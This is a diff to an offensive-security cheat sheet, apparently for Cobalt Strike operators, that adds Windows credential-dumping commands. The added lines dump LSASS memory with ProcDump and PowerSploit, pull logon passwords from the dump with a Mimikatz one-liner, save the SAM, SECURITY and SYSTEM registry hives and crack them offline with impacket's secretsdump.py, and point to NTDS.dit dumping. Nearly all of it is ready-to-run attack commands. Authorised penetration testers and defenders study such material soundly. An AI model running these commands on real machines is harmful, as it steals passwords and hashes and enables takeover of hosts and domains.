@@ -102,14 +102,32 @@ SharpDPAPI and SharpChrome
 Dumping LSASS with ProcDump.exe (requires touching disk) (NOTE: Might get flagged by AV and raise alerts but will often still output dump file)
 ```
 # upload --> ProcDump.exe
-# shell ProcDump.exe -ma lsass.exe lsass.dmp
+# shell ProcDump.exe -accepteula -ma lsass.exe lsass.dmp
 ```
 Dumping LSASS with [Out-Minidump.ps from PowerSploit](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1)
 ```
 # powershell Get-Process | Out-Minidump -DumpFilePath C:\temp
 ```
+Extracting hashes offline from LSASS using Mimikatz
+```
+# mimikatz.exe log "privilege::debug" "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" "sekurlsa::wdigest" exit
+```
+### SAM dump
+```
+# reg.exe save HKLM\sam sam.save
+# reg.exe save HKLM\security security.save
+# reg.exe save HKLM\system system.save
+
+Download files to dump SAM hahses offline using [Secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py)
+# python secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
+```
+### NTDS.dit dump
+Secretsdump.py to dump NTDS.dit hashes remotely
+
+NTDSutil to dump NTDS.dit locally on a Domain Controller
 
 ---
 # References
 Cobalt Strike commands cheat-sheet: https://github.com/S1ckB0y1337/Cobalt-Strike-CheatSheet
 Sharphound: https://github.com/BloodHoundAD/SharpHound3
+Mimikatz reference cheat sheet: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Mimikatz.md
